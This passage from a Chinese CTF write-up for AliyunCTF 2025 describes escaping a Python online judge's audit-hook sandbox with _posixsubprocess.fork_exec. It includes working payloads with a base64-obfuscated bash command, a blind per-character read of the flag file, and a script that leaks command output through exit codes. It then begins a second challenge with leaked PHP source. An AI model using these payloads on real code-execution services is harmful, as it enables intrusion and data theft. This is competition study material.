infile<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span>        expected_output_file<span class="token punctuation">,</span> <span class="token string">"r"</span>    <span class="token punctuation">)</span> <span class="token keyword">as</span> expected_output<span class="token punctuation">:</span>        expected_output_content <span class="token operator">=</span> expected_output<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>            <span class="token punctuation">[</span><span class="token string">"python3"</span><span class="token punctuation">,</span> code_filename<span class="token punctuation">]</span><span class="token punctuation">,</span>            stdin<span class="token operator">=</span>infile<span class="token punctuation">,</span>            stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>            stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>            text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>            process<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">raise</span> OJTimeLimitExceed        <span class="token keyword">if</span> process<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> OJRuntimeError<span class="token punctuation">(</span>process<span class="token punctuation">.</span>returncode<span class="token punctuation">)</span>        <span class="token keyword">if</span> stdout<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> expected_output_content<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不出网且执行无回显，不过可以 rce 之后可以这样写<code>whoami &gt; ../server.py</code>来获取回显</p><p>核心放在代码模板上：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> math<span class="token keyword">import</span> collections<span class="token keyword">import</span> queue<span class="token keyword">import</span> heapq<span class="token keyword">import</span> bisect<span class="token keyword">def</span> <span class="token function">audit_checker</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> event <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"import"</span><span class="token punctuation">,</span><span class="token string">"time.sleep"</span><span class="token punctuation">,</span><span class="token string">"builtins.input"</span><span class="token punctuation">,</span><span class="token string">"builtins.input/result"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> RuntimeErrorsys<span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>audit_checker<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>OUR_CODE<span class="token operator">>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的hook是白名单机制</p><p>允许 import，打 posix，参考：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html#_posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html#_posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> _posixsubprocess<span class="token comment"># s = input().split()</span><span class="token comment"># print(int(s[0]) + int(s[1]))</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"sleep 1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> _posixsubprocess_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b""</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"&#123;echo,ZW52ID4gLi4vc2VydmVyLnB5&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"env > server.py"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地通了，但是远程写文件在各个目录都没反应，sleep可以正常执行</p><p>利用 A+B problem 里 output 样例有2的情况，构造一个内容为2的文件并读取来测试权限</p><p>最后发现能写文件的只有 submissions 目录和 &#x2F;tmp</p><p>总不能盲注吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> _posixsubprocesscmd<span class="token operator">=</span><span class="token string">'if [ `cut -c 1 /f*` = "a" ];then echo 2;fi'</span>_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span>cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/bash"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回 Wrang Answer: pass(1&#x2F;10) ，那就真的盲注吧</p><p>最后以一种很丑陋的方式来注（</p><p><img src="/blog/2025/02/22/AliyunCTF2025/image-20250223024429252.png" alt="image-20250223024429252"></p><p>得到flag：<code>aliyunctf&#123;8d7de2fe-77dd-4dde-9c3f-b6fbd55654d7&#125;</code></p><h2 id="带出回显"><a href="#带出回显" class="headerlink" title="带出回显"></a>带出回显</h2><p>执行命令并将结果写入到退出码中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsURL <span class="token operator">=</span> <span class="token string">"http://10.253.253.1/api/submit"</span>CODE_TEMPLATE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""import _posixsubprocessimport osimport timeimport sysstd_pipe = os.pipe()err_pipe = os.pipe()_posixsubprocess.fork_exec(    (b"/bin/bash",b"-c",b"ls /"),    [b"/bin/bash"],    True,    (),    None,    None,    -1,    -1,    -1,    std_pipe[1], #c2pwrite    -1,    -1,    *(err_pipe),    False,    False,    False,    None,    None,    None,    -1,    None,    False,)time.sleep(0.1)content = os.read(std_pipe[0],1024)content_len = len(content)if &#123;loc&#125; &lt; content_len:    sys.exit(content[&#123;loc&#125;])else:    sys.exit(255)"""</span>command<span class="token operator">=</span><span class="token string">"ls /"</span>received <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> CODE_TEMPLATE<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>loc<span class="token operator">=</span>i<span class="token punctuation">,</span>command<span class="token operator">=</span>command<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"problem_id"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"code"</span><span class="token punctuation">:</span>code<span class="token punctuation">&#125;</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span>json<span class="token operator">=</span>data<span class="token punctuation">)</span>    resp_data <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>resp_data<span class="token punctuation">[</span><span class="token string">"status"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"RE"</span><span class="token punctuation">)</span>    ret_loc <span class="token operator">=</span> resp_data<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"ret="</span><span class="token punctuation">)</span>    ret_code <span class="token operator">=</span> resp_data<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>ret_loc<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> ret_code <span class="token operator">==</span> <span class="token string">"255"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    received <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>ret_code<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>received<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="打卡OK（复现）"><a href="#打卡OK（复现）" class="headerlink" title="打卡OK（复现）"></a>打卡OK（复现）</h1><p>dirsearch扫出来&#x2F;index.php~</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"Please login!\");window.location.href=\"./login.php\";&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>打卡系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>HTML5 Template<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Forum - Responsive HTML5 Template<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Forum<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shortcut icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>favicon/favicon.ico<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>format-detection<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>telephone=no<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1, shrink-to-fit=no<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- tt-mobile menu --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>panel-menu<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mobile-menu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mm-navbtn-names<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mm-closebtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            Close            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tt-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>use</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#icon-cancel<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>use</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mm-backbtn<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Back<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tt-pageContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tt-wrapper-inner<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tt-title-border<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                补卡系统            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-default form-create-topic<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inputTopicTitle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tt-value-wrapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inputTopicTitle<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span 